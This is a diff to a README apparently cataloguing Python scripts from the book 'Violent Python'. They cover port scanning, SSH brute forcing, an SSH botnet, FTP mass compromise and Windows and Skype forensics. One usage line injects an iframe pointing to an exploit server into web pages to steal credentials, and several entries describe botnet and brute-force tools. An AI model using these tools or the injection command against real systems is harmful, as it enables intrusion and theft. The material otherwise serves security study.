@@ -14,50 +14,58 @@ Where possible i display all he codes with result Jupyter notebook (#FileFormat 
   
 # Penetration Testing  
 ## PortScan.py  
-
+### Building a port scanner
 In the command Line pass the port argument as a string i.e in " " for multiple port like follow;  
 taymour:∼# python portScan.py -H 10.50.60.125 -p "21, 1720"  
   
 ## Nmap_Port_Scanner.py
+### Nmap Port Scanner
 Scan the ports on the provided hosts.
 
 ## D) SSH_Botnet.py
+### BUILDING AN SSH BOTNET WITH PYTHON
 Issue commands on ssh hosts at once provided you have the user names and passwords.
 
 ## E) sshBrute.py
+### Brute Forcing SSH Passwords with Pxssh
 Brute forces a host's ssh server with a provided worldlist
 
 ## H) botNet.py
+### Constructing the SSH Botnet
 Change IP, Root, Password to issue SSH commands on compromised machines.
 
-## I) anonLogin.py  
+## I) anonLogin.py
+### 
 First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or uncomment it  
 
 ## L) massCompromise.py  
+### MASS COMPROMISE BY BRIDGING FTP AND WEB
 In command line following options are required to attack web pages and inject your own html file to steal compromised user credentials in default location  
 Usage from terminal      
 taymour# python massCompromise.py -H 192.168.95.179 -r '<iframe src="  
 http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt  
 
-## M) discoverNetworks.py    
+# Forensic Investigations with Python
+## M) discoverNetworks.py 
+### ANALYSIS OF WIRELESS ACCESS POINTS IN THE REGISTRY, Using Mechanize to Submit the MAC Address to Wigle
 Allow to analyse connected wifi through mac adress by reading windows registry  
 Usage from command prompt    
 (py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
   
 ## N) dumpRecycleBin.py  
-  
+### RECOVER DELETED ITEMS IN THE RECYCLE BIN
 Allows to discover deleted items in windows operating system ,also provide information about the user who delete files
 
 
 ## O) PdfRead.py
-
+### Using PyPDF to Parse PDF Metadata
 Usage#  
 taymour:!# python pdfRead.py -F Violent_Python.pdf  
 provide metadata and information about pdf like creation date, user, title, creator, producer etc.  
 
 
 ## P) exifFetch.py
-
+### Reading Exif Metadata from Images
 build a script to connect to a Website, download all the images on the site, and then check them for Exif metadata.  
 #Usage in CMD   
   
@@ -65,8 +73,11 @@ python exifFetch.py -u http://www.flickr.com/photos/dvids/4999001925/sizes/o
 
 
 ## Q) skype-parse.py  
-### Using Python and Sqlite3 to Automate Skype Database Queries
+### INVESTIGATING SKYPE APPLICATION ARTIFACTS
   
 List out variety of contents of skype in python console about skype user history name, tags, location, text messages etc  
 Usage#  
 python skype-parse.py -p C:\AppData\Roaming\Microsoft\Skype_for_Desktop\skylib\taymourniazi  
+  
+## R) .py  
+###
